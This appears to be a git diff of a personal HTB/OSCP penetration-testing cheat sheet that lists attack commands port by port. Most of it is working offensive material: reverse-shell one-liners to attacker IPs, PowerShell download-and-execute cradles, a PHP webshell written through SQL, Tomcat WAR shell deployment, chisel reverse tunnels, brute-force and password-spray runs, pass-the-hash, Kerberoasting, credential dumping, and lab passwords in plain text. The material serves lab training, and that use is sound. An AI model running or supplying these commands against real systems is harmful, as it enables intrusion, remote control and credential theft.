@@ -1,38 +1,35 @@
 # Useful Commands for HTB/OSCP
 > **Website**: https://IslandDog.ky
-
-> **Last Update**: 08/31/21
-
-> **Recent Changes**: Changes to privesc notes and highlighting of different uses.
+> **Last Update**: 06/28/22
+> **Recent Changes**: Huge changes to multiple sections pulled from my Obsidian. I'm back =).
 
 ## RustScan - #rustscan 
 ```bash
 #Intial
-rustscan -a $IP && xsltproc scan -o scan-${PWD##*/}.html
+echo 'export ip=10.10.11.168' > ~/.zshenv
+rustscan -a $ip && xsltproc scan -o intial-${PWD##*/}.html
 #AllPorts
-sudo nmap -sC -sV -T4 -v -p- --script 'default,vuln' -oX scan-all 10.10.10.241 && xsltproc scan-all -o scan-allports.html && rm -rf scan-all
+sudo nmap -sC -sV -T4 -v -p- --script 'default,vuln' -oX scan-all $ip && xsltproc scan-all -o ${PWD##*/}-allports.html
 #UDP
-sudo nmap -sU -sV --version-intensity 0 -F -n ${PWD##*/}
+sudo nmap -sU -sV --version-intensity 0 -F -n $ip -oX ${PWD##*/}-udp
 ```
 
 ## Reverse Shell #OneLiners
 ```bash
+#Visit - https://weibell.github.io/reverse-shell-generator/
 bash -i >& /dev/tcp/10.0.0.1/1234 0>&1
 rm /tmp/h;mkfifo /tmp/h;cat /tmp/h|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/h
 {nc.tradentional|nc|ncat|netcat} 10.0.0.1 1234 {-e|-c} /bin/bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);s.close()'
 python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);os.putenv("HISTFILE","/dev/null");pty.spawn("/bin/bash");s.close()'
+powershell IEX(New-Object Net.webclient).downloadString('http://10.10.14.4/Invoke-ConPtyShell.ps1'); Invoke-ConPtyShell 10.10.14.4 9002
 ```
 
 ## TTY SHELLS #tty
 ```bash
-stty size #Find your terminal size -> 50 235
-Ctrl-Z
-stty raw -echo  // Disable shell echo
-fg
+stty raw -echo; (stty size; cat) | nc -lvnp 9002
 export SHELL=bash
 export TERM=xterm OR export TERM=xterm-256color
-stty rows 50 columns 235
 ```
 
 #tty_python
@@ -64,23 +61,22 @@ exec "/bin/bash"
 os.execute('/bin/bash')}
 ```
 
-## Useful Kali Directories #WSO #PrivEsc #Windows 
-```bash
-ls /opt/webshells/webshells
-ls /opt/windows-binaries/
-```
-
 ## File Uploading/Downloading #Windows #PowerShell #WGET #SMB 
 ```bash
+#https://github.com/egre55/ultimate-file-transfer-list
+#PowerShell Related
 powershell IEX (New-Object Net.WebClient).DownloadString('http://10.0.0.1/webshells/Invoke-PowerShellTcp.ps1')
 powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://10.0.0.1/', '<DESTINATION_FILE>')
 powershell "wget http://10.0.0.1/"
+#Requires wget.vbs file
 cscript wget.vbs http://10.0.0.1/file.exe FILEYOUNEED
 sudo smbserver.py -comment 'Transfer' smb smb
+#Use alongside curl/wget
+sudo python3 -m http.server 80
 sudo python -m SimpleHTTPServer 80
+#Windows based
 certutil.exe -urlcache -split -f "http://10.0.0.1/privesc/Powerless.bat" Powerless.bat
 scp <SOURCE_FILE> <USER>@${PWD##*/}:<DESTINATION_FILE>
-https://github.com/egre55/ultimate-file-transfer-list
 ```
 
 ## PrivEsc Tools #PrivEsc #LinPEAS #WinPEAS #Powerless
@@ -208,43 +204,61 @@ CVE-2008-0166 - https://www.exploit-db.com/exploits/5720
 
 ### 53 #DNS 
 ```bash
-dig @${PWD##*/} -x ${PWD##*/}
-dnsenum ${PWD##*/}
-dnsrecon -d ${PWD##*/}
-dnsrecon -d ${PWD##*/} -a
-dig axfr ${PWD##*/} @ns1.test.com
+dig version.bind CHAOS TXT @$ip
+dig $ip -x $ip
+dnsenum $ip
+dnsrecon -d $ip
+dnsrecon -d $ip -a
+dig $ip @IP axfr
 ```
 ### 79 #FINGER
 ```bash
-finger @${PWD##*/}
-finger <USER>@${PWD##*/}
-finger "|/bin/id@${PWD##*/}"
-finger "|/bin/ls -a /${PWD##*/}"
+finger @$ip
+finger <USER>@$ip
+finger "|/bin/id@$ip
+finger "|/bin/ls -a /$ip"
 ```
 
 ### 80/8080/443 #HTTP 
+#Visual
+```
+#Always intercept a request with Burp suite and check headers.
+```
+```bash
+curl -I $ip
+```
+```
+#Always view the source for external resources or scripts.
+#Check forms/links to see if they are valid/calling out.
+```
 #DirectoryScan #FeroxBuster #HostScan #Logins
 ```bash
-feroxbuster -u http://${PWD##*/}/ -x php js txt -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt --extract-links
-nikto -host http://${PWD##*/} -C all -o nikto-scan.html
-nikto -host http://${PWD##*/} -p 80,8080,1234 -C all -o nikto-all.html
-nikto -h ${PWD##*/} -useproxy http://${PWD##*/}:4444 #squidcd
+#FeroxBuster requires my config or additional flags for threads/etc.
+#Use Raft - Words/Files/Directories.
+feroxbuster -u $ip -e -w /opt/SecLists/Discovery/Web-Content/raft-medium-words-lowercase.txt
+ffuf -b 'PHPSESSID=kn7hggb0pkp4nn9oin2dfs9mcu' -w /opt/seclists/Discovery/Web-Content/raft-medium-words-lowercase.txt  -u 'https://website.htb/admin/?FUZZ'
+#-p on nikto for specific ports.
+# -useproxy for Burp/Squid intercepts.
+nikto -host $ip -C all -o nikto-scan.html
 ```
 
 #sub-domain #domains
 ```bash
-gobuster vhost -u ${PWD##*/} -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 50
-gobuster dns -d ${PWD##*/} -w /opt/SecLists/Discovery/DNS/subdomains-top1million-110000.txt -t 50
+gobuster vhost -u $ip -w /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
+gobuster dns -d 'domain.htb' -w /opt/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 50
+ffuf -w /opt/seclists/Discovery/DNS/subdomains-top1million-110000.txt -u 'domain.htb' -H "Host: FUZZ.domain.htb" -fw 1
 ```
 
 #SQL
 ```bash
-sqlmap --wizard
-sqlmap --force-ssl
+# --force-ssl flag for SSL bypass
+sqlmap --wizard --dump-all
 #Grab the Request from Burp for Login/Form Req
 sqlmap -r req --os-pwn
 #Use OS-Shell alongside a Bash One-liner for a more stable shell.
 sqlmap -r req --os-shell
+#Specify specific databases/tables
+sqlmap -r req --force-ssl -D DATABASE -T TABLE --batch -C rows,rows,rows --dump
 ```
 
 #IIS
@@ -257,13 +271,14 @@ msf6 auxiliary(scanner/http/iis_shortname_scanner)
 #WordPress 
 ```bash
 #Can also be used for password sprays
-wpscan --url http://${PWD##*/}/ --enumerate ap,at,tt,cb,dbe,u,m
+wpscan --url $ip --enumerate ap,at,tt,cb,dbe,u,m
 ```
 
 #webdav
 ```bash
-cadaver http://${PWD##*/}:8080/webdav/
+cadaver http://domain.htb:8080/webdav/
 ```
+
 #ShellShock
 ```bash
 #Outdated
@@ -283,6 +298,7 @@ Tomcat6:
 ```bash
 wget 'http://<USER>:<PASSWORD>@${PWD##*/}:8080/manager/deploy?war=file:shell.war&path=/shell' -O -
 ```
+
 Tomcat7/Above:
 ```bash
 curl -v -u <USER>:<PASSWORD> -T shell.war 'http://${PWD##*/}:8080/manager/text/deploy?path=/shellh&update=true'
@@ -301,9 +317,10 @@ curl http://${PWD##*/}:8080/shell/
 
 #LFI/RFI - LoginForms - #SecLists Generic-SQLi.txt
 ```bash
-/opt/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
-http://${PWD##*/}/page=http://192.168.1.101/maliciousfile.txt%00
-http://${PWD##*/}/page=http://192.168.1.101/maliciousfile.txt?
+#https://raw.githubusercontent.com/carlospolop/Auto_Wordlists/main/wordlists
+#/opt/SecLists/Fuzzing/LFI/LFI-LFISuite-pathtotest-huge.txt
+ffuf -b 'PHPSESSID=kn7hggb0pkp4nn9oin2dfs9mcu' -w /opt/seclists/Fuzzing/LFI/LFI-Jhaddix.txt   -u 'https://website.htb/admin/?parameter=FUZZ' -fs 1712
+
 ```
 
 #ImageUpload 
@@ -326,33 +343,33 @@ rpcinfo -p ${PWD##*/}
 ### 139/445 - ```smb://[putinip]/```#SMB 
 #smbclient - Start here
 ```bash
-smbclient -N -L ${PWD##*/}
+smbclient -N -L $ip
 smbclient -L \\\\${PWD##*/} -U 'Tiffany.Molina'
 smbclient -U 'tyler%92g!mA8BGjOirkL%OG*&' //${PWD##*/}/new-site -c 'put nc.exe nc.exe'
 smbclient -U 'administrator%u6!4ZwgwOM#^OBf#Nwnh'
 \\\\${PWD##*/}\\c$
-enum4linux -a -k none '${PWD##*/}'
+enum4linux -a -k none $ip
 ```
 #crackmapexec #password_spray
 ```bash
-crackmapexec smb ${PWD##*/} -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' --shares
-crackmapexec smb ${PWD##*/} -u users.txt -p passwords.txt --shares --continue-on-success
-medusa -h ${PWD##*/} -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt
-winexe -U username //${PWD##*/} "cmd.exe" --system
+crackmapexec smb $ip -u 'tyler' -p '92g!mA8BGjOirkL%OG*&' --shares
+crackmapexec smb $ip -u users.txt -p passwords.txt --shares --continue-on-success
+medusa -h $ip -u userhere -P /usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt -M smbnt
+winexe -U username //$ip "cmd.exe" --system
 ```
 
 #mounting-shares
 ```bash
-mount -t cifs '//${PWD##*/}/new-site' smb -v -o user=tyler
+mount -t cifs '//$ip/new-site' smb -v -o user=tyler
 umount smb
 ```
 
 #SMB - Shells via Impacket
 ```bash
-psexec.py <DOMAIN>/<USER>:<PASSWORD>@${PWD##*/}
-wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@${PWD##*/}
-smbexec.py <DOMAIN>/<USER>:<PASSWORD>@${PWD##*/}
-atexec.py <DOMAIN>/<USER>:<PASSWORD>@${PWD##*/} <COMMAND>
+psexec.py <DOMAIN>/<USER>:<PASSWORD>@$ip
+wmiexec.py <DOMAIN>/<USER>:<PASSWORD>@$ip
+smbexec.py <DOMAIN>/<USER>:<PASSWORD>@$ip
+atexec.py <DOMAIN>/<USER>:<PASSWORD>@$ip <COMMAND>
 ```
 
 #PTH - Pass the Hash
@@ -365,20 +382,23 @@ pth-winexe -U username/Administrator%aad3b435b51404eeaad3b435b51404ee:e0fb1fb857
 ```
 ### 161/162 #SNMP
 ```bash
-snmp-check -c public ${PWD##*/}
-onesixtyone -c /usr/share/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt ${PWD##*/}
+snmp-check -c public $ip
+onesixtyone -c /usr/share/wordlist/SecLists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt $ip
 ```
 
 ### 389/636/3268/3269 #LDAP
 ```bash
-sudo nmap 7sV -p389 ${PWD##*/}
-rpcclient -U '' -N ${PWD##*/}
+sudo nmap 7sV -p389 $ip
+rpcclient -U '' -N $ip
 enumdomusers
 enumdomgroups
-ldapsearch -D "cn=admin,dc=acme,dc=com" "(objectClass=*)" -w ldapadmin -h ${PWD##*/}
-ldapsearch -h ${PWD##*/} -p 389 -x -b "dc=megacorp,dc=local"
-ldapsearch -h ${PWD##*/} -x -s base namingcontexts
-ldapsearch -h ${PWD##*/} -x -s sub -b "DC=megacorp,DC=local" |tee ldap.out && cat ldap.out |grep -i memberof
+./kerbrute_linux_amd64 passwordspray --dc $ip -d domain.htb user_file "PasssWord"
+/opt/kerbrute/kerbrute_linux_amd64 userenum --dc $ip -d domain.htb /opt/seclists/Usernames/top-usernames-shortlist.txt
+ldapsearch -D "cn=admin,dc=acme,dc=com" "(objectClass=*)" -w ldapadmin -h $ip
+ldapsearch -h $ip -p 389 -x -b "dc=megacorp,dc=local"
+ldapsearch -h $ip -x -s base namingcontexts
+ldapsearch -h $ip -x -s sub -b "DC=megacorp,DC=local" |tee ldap.out && cat ldap.out |grep -i memberof
+impacket-GetUserSPNs domain.htb/user.name -dc-ip '$ip' -no-pass -request -outputfile hash
 ```
 
 ### 1433 #MSSQL
@@ -436,6 +456,7 @@ hydra -L users -P passwords ${PWD##*/} mysql -vV -I -u
 mysql -u <USER>
 mysql -h ${PWD##*/} -u <USER> -p
 connect [database]
+use database;
 show tables;
 select * from [table name]
 ```
@@ -449,11 +470,11 @@ select 1,2,"<?php echo shell_exec($_GET['c']);?>",4 into OUTFILE '<OUT_FILE>'
 ```
 ### 3389 #RDP
 ```bash
-rdesktop -u guest -p guest ${PWD##*/} -g 94%
-rdesktop -d <DOMAIN> -u <USERNAME> -p <PASSWORD> ${PWD##*/}
-xfreerdp /u:[DOMAIN\]<USERNAME> /p:<PASSWORD> /v:${PWD##*/}
-xfreerdp /u:[DOMAIN\]<USERNAME> /pth:<HASH> /v:${PWD##*/}
-ncrack -vv --user Username -P /usr/share/wordlists/rockyou.txt rdp://${PWD##*/}
+rdesktop -u guest -p guest $ip -g 94%
+rdesktop -d <DOMAIN> -u <USERNAME> -p <PASSWORD> $ip
+xfreerdp /u:[DOMAIN\]<USERNAME> /p:<PASSWORD> /v:$ip
+xfreerdp /u:[DOMAIN\]<USERNAME> /pth:<HASH> /v:$ip
+ncrack -vv --user Username -P /usr/share/wordlists/rockyou.txt rdp://$ip
 ```
 
 ### 5800/58001/5900/5901 #VNC
@@ -475,6 +496,15 @@ evil-winrm -i ${PWD##*/} -u <USER> -H <HASH>
 
 ### Misc
 
+#PortForwarding 
+```powershell
+wget http://10.10.14.4/chisel.exe -o C:/downloads/crx/chisel.exe
+#OnVictim - AttackIP:ChiselPort R:ReversePort:127.0.0.1:ReversePort
+.\chisel client 10.10.14.4:9002 R:1433:127.0.0.1:1433
+#OnAttacker
+chisel server --reverse --port 9002
+```
+
 #Windows #ReverseShells
 ```bash
 cp /usr/share/windows-resources/binaries/nc.exe .
@@ -495,8 +525,19 @@ secretsdump.py -sam sam.hive -system system.hive -security security.hive -ntds n
 
 #Bruteforce
 ```bash
-hydra -V -f -L users -P passwords ftp://${PWD##*/} -u -vV
-hydra -V -f -L users -P passwords ssh://${PWD##*/} -u -vV
+#Username Bruteforce on HTTP Form - Requires Error Code 'Invalid Credentials'
+hydra -L /opt/seclists/Usernames/cirt-default-usernames.txt -p password -s 5000 10.10.10.10 http-form-post "/login:username=^USER^&password=^PASS^:Invalid credentials"
+```
+
+#Firefox 
+```bash
+python3 firefox_decrypt.py br53rxeg.default-release
+```
+
+#BloodHound 
+```bash
+bloodhound-python -u UserName -p "PassWord" -ns 10.10.11.158 -d domain.htb -c all
+sudo neo4j start
 ```
 
 ![[id.png|20x20]] IslandDog - Christopher Soehnlein 2021
